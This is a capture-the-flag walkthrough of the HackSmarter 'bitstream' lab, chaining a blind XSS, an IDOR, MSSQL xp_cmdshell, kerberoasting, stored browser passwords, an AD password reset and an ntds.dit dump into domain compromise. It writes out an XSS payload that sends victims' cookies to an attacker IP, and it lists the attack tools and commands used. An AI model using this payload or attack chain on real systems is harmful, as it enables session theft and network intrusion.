---
platform: hacksmarter
name: bitstream
os: linux/windows
difficulty: easy
status: rooted
ip: 10.0.0.5 (Entry)
date: 2026-10-02
tags:
  - ctf
  - range
  - activedirectory
  - backup_operators
  - browser_stored_passwords
  - xss
  - socks
  - proxy
  - psmapexec
  - kerberoast
  - secretsdump
  - mssql
  - rce
  - xpcmdshell
  - idor
  - autologon
  - autologon_credentials
techniques: []
---
# bitstream

> [!info] Box Info
> - **Platform: HackSmarter**
> - **OS: Windows and Linux**
> - **Difficulty: Easy**
> - **Entry IP: 10.0.0.5**

## Recon
### Port Scan

```bash 
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 43:78:c2:a8:c9:68:cc:9f:f3:4d:ff:6e:a5:5d:5e:f7 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNQhTH9urBSuemYu9lP5OotxmXeUYgIklJESndMO+A1ufFDLfbDQt5MyZj1oOqK5+GFu0h02FBBIZAkfpreL5Lk=
|   256 58:2a:87:82:56:8a:ce:6a:1f:7e:d2:6f:2f:bb:c2:49 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAII+OwCCxz/XZzU3otk5fJfrTWRQZtJNUNgBjU+axsQ7f
80/tcp open  http    syn-ack ttl 62 Node.js (Express middleware)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: BitStream Storage - Corporate Cloud Solutions
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Webapp (80)
#### Directory Fuzzing with ffuf

```
login - 200
logout - 200
portal - 200
features - 200
quote - 200
pricing - 200
```
## Getting Joey's Session 

Manually walking the application reveals to important pages that we can now threat model/brainstorm. Messing around with these two endpoints gives me a few test cases.
- Portal Login
	- SQLi?
	- Weak Credentials?
	- SSTI via Error Parameter?
	- XSS via Error Parameter?
- Get a Quote Page
	- Blind XSS?

![](assets/Pasted%20image%2020261002214746.png)

![](assets/Pasted%20image%2020261002214810.png)

Starting with the login page. SQLi and weak credentials test cases failed. Additionally, although the `error` parameter reflected whatever value is passed to it, it did not result in XSS (HTML encoded output) or SSTI. For SSTI testing, I used a tool called SSTImap.
![](assets/Pasted%20image%2020261002215358.png)

![](assets/Pasted%20image%2020261002215555.png)

This leaves us with the quote endpoint. The only thing that came to mind is blind XSS. I stand up a python web server and try out my first payload to find that it was successful.

```html
<svg/onload=document.location='http://192.168.211.2/XSS?c='+document.cookie>
```

![](assets/Pasted%20image%2020261002220113.png)

![](assets/Pasted%20image%2020261002220208.png)

I can now set the cookie via devtools. This gives me an active session.

![](assets/Pasted%20image%2020261002220452.png)

![](assets/Pasted%20image%2020261002220511.png)

## Getting svc_sql Credentials

In the portal there are three features:
- Support Tickets Queue
- Recent Quotes
- Internal Messaging

![](assets/Pasted%20image%2020261002221741.png)

The queue results in nothing and the quotes fires out XSS payload that I submitted. However, the messaging inbox contains various messages.

![](assets/Pasted%20image%2020261002221855.png)

Clicking through these messages reveals that some were deleted because each message has an ID as its endpoint; some messages are missing from 1 - 24.

![](assets/Pasted%20image%2020261002222053.png)

IDOR is the first thing to come to mind, because although some messages are missing visually, they can potentially be accessed by supplying their respective IDs. I tried one that did not show up visually which is Message #1 and it worked.

![](assets/Pasted%20image%2020261002222255.png)

Using Burp intruder, I was able to find one message that contained the SQL service account credentials.

![](assets/Pasted%20image%2020261002222641.png)

Additionally, I want to take note of all users discovered via this messaging endpoint.

```
joey@bistream.hsm
jon@bitstream.hsm
tommy@bitstream.hsm
```

I also set the `bitstream.hsm` domain to the server's ip in my hosts file. The reason I wanted to do this is because in one message, they talked about a staging site. With this information, I can try to fuzz for any subdomains. Unfortunately, nothing came out of this.

## RCE on SQL Server

With these sql credentials, I can now target the sql server. Though I thought I needed to pivot from the web server's to the next subnet via socks, that was not the case. I was able to get ports back for all servers in subnet 2 (10.0.1.0/24).

![](assets/Pasted%20image%2020261002233829.png)

I can use mssqlclient from impacket with sql_svc's creds.

```bash
mssqlclient_stable.py bitstream.hsm/sql_svc:'<password>'@10.0.1.7
```

![](assets/Pasted%20image%2020261002234141.png)

Using `enum_logins`, I can see that sql_svc is a sysadmin meaning the highest database authority. I can use xp_cmdshell to execute commands on the server.

![](assets/Pasted%20image%2020261002234338.png)

![](assets/Pasted%20image%2020261002234507.png)

## Getting Bob Credentials

Doing common privesc checks I discovered autologon creds for bob.

![](assets/Pasted%20image%2020261003235147.png)

## Getting Eddie Credentials

Additionally using deadpotato, I can add bob to the local administrators group and rdp just to check his home directory.

I found dpapi secrets that I took offline and decrypted. Unfortunately nothing good (maybe). I retrieved a username that looks like a password. `02dilgdqihmaejmy`

![](assets/Pasted%20image%2020261007193901.png)

Using PsMapExec, I continue to enumerate the domain and objects further. I found the user `eddie` is kerberoastable.

![](assets/Pasted%20image%2020261007200509.png)

Thankfully this is an a 23 etype, meaning rc4. Easily crackable.

![](assets/Pasted%20image%2020261007201047.png)

## Getting Luisa Credentials

After some digging and enumeration, I ended up on workstation and tried looking for privesc methods and even decrypted dpapi secrets offline. Unfortunately, I had nothing. Eventually, I opened up Edge to check for stored passwords. When opened, the browser immediately prompts me to restore closed tabs and reveals that there is a stored gitlab password for luisa in the browser.

![](assets/Pasted%20image%2020261007210338.png)

## Changing Password for James

With the bloodhound data that I already had, I check what outbound control luisa has. Luisa has genericall on the james user.

![](assets/Pasted%20image%2020261007210631.png)

Using our socks proxy with proxychains and bloodyAD, I force change the password for james with luisa's credentials.

![](assets/Pasted%20image%2020261007210839.png)

## Getting svc_backup Credentials -> Domain Compromise 

Enumeration with the james account reveals read access to the Scripts share on the SHARE server.

![](assets/Pasted%20image%2020261007211006.png)

Using impacket's smbclient tool, I dump all scripts in the share.

![](assets/Pasted%20image%2020261007211256.png)

The `Automated-AD-Backup.ps1` scripts reveals creds for the svc_backup service account and that the account belongs to the backup_operators group. This script takes ntds.dit and backs it up to the windows/temp folder. I can now use secretsdump to dump ntds.dit using the svc_backup credentials.

![](assets/Pasted%20image%2020261007211655.png)

![](assets/Pasted%20image%2020261007222012.png)
## Loot
- [x] user.txt:
- [x] root.txt: